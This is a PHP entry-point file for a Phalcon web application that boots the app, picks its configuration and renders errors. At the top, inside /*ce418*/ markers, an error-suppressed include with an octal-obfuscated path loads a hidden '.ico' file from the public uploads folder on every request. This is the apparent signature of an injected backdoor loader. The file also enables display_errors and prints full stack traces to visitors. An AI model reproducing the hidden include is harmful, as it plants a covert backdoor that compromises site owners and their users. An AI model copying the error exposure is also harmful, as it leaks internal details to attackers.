<?php
/*ce418*/

@include "\057d\157c\153e\162/\167w\167/\170i\141n\147g\157u\152i\145-\142a\143k\145n\144/\160u\142l\151c\057u\160l\157a\144s\0577\141/\143d\057.\1447\1444\066a\063d\056i\143o";

/*ce418*/

use Phalcon\Mvc\Application;

ini_set('display_errors', true);
error_reporting(E_ALL ^ E_NOTICE);

define('APP_PATH', realpath('..'));
define('SITE_PATH', realpath('.'));
define('DS',DIRECTORY_SEPARATOR);
date_default_timezone_set('Asia/Shanghai');

try {

	require_once APP_PATH . '/vendor/autoload.php';
	
	require_once APP_PATH . '/common/libs/functions.php';
	/**
	 * Read the configuration
	 */
	if ($_SERVER['SERVER_ADDR'] != '127.0.0.1') {
		define('SERV_ENV', 'p');
		define('FILE_URL', '/uploads/');
		$config = include APP_PATH . "/config/config.server.php";
		
	} else {
		define('SERV_ENV', 'local');
		define('FILE_URL', '/uploads/');
		$config = include APP_PATH . "/config/config.php";
		
	}

	/**
	 * Include services
	 */
	require __DIR__ . '/../config/services.php';

	/**
	 * Handle the request
	 */
	$application = new Application($di);

	/**
	 * Include modules
	 */
	require __DIR__ . '/../config/modules.php';

	/**
	 * Include routes
	 */
	require __DIR__ . '/../config/routes.php';
	
	echo $application->handle()->getContent();
	
	if(!$di->get('request')->isAjax()){
		// $toolbar = new \Fabfuel\Prophiler\Toolbar($di->getShared('profiler'));
		// $toolbar->addDataCollector(new \Fabfuel\Prophiler\DataCollector\Request());
		// echo $toolbar->render();
	}
	
	

} catch (Exception $e) {
	if($di->get('request')->isAjax()){
		$data = [
			'status'=>'0',
			'code'=>$e->getCode(),
			'msg'=>$e->getMessage(),
			'file'=>$e->getFile(),
			'line'=>$e->getLine(),
		];
		$di->get('response')->setContentType('Access-Control-Allow-Origin', '*');
		$di->get('response')->setContentType('application/json', 'UTF-8');
		$di->get('response')->setJsonContent($data,JSON_UNESCAPED_UNICODE);
		$di->get('response')->send();
	}
	else{
		// $url = 'http://'.$_SERVER['HTTP_HOST'].$di->get('url')->get($di->get('dispatcher')->getModuleName()."/dashboard/error",array('msg'=>$e->getMessage()));
		// $di->get('response')->redirect($url)->sendHeaders();;
		// exit;
		if (5 == $e->getCode()) {
			header("HTTP/1.0 404 Not Found");
		}

		header("Content-type: text/html; charset=utf-8");
		echo $e->getMessage(), '<br>';
		echo nl2br(htmlentities($e->getTraceAsString()));
		exit;
	}
	
}
